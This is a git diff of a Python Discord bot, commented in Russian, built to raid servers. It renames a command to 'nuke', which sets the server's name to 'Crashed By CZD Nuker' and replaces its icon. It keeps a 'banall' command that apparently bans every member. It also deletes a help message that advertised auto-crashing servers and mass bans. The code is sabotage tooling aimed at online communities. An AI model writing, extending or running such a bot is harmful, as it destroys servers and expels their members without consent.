@@ -4,7 +4,7 @@ from requests import put
 import discord
 from asyncio import create_task
 
-prefix = '!' # наш префикс
+prefix = '!' # префикс бота
 
 token = 'токен бота'
 
@@ -50,7 +50,7 @@ async def createrole(ctx):
         pass
 
 @client.command()
-async def go(ctx):    
+async def nuke(ctx):    
     with open('icon.PNG', 'rb') as f:
         icon = f.read()
         await ctx.guild.edit(name='Crashed By CZD Nuker', icon=icon)
@@ -83,14 +83,5 @@ async def banus(ctx, limit=None):
 @client.command()
 async def banall(ctx):
     create_task(banus(ctx,limit=None))
-
-@client.command()
-async def help(ctx):
-    try:
-        await ctx.author.send(embed=discord.Embed(title='Команды',description=f'`w.kill` - авто краш сервера\n`w.rename` - сменить иконку и имя серверу\n`w.banall` - бан всех участников сервера',colour=discord.Colour.from_rgb(237, 47, 47)))
-    except:
-        await ctx.send(embed=discord.Embed(title='Открой личку чтобы узнать команды'))
-
-    await ctx.message.delete()
 
 client.run(token)
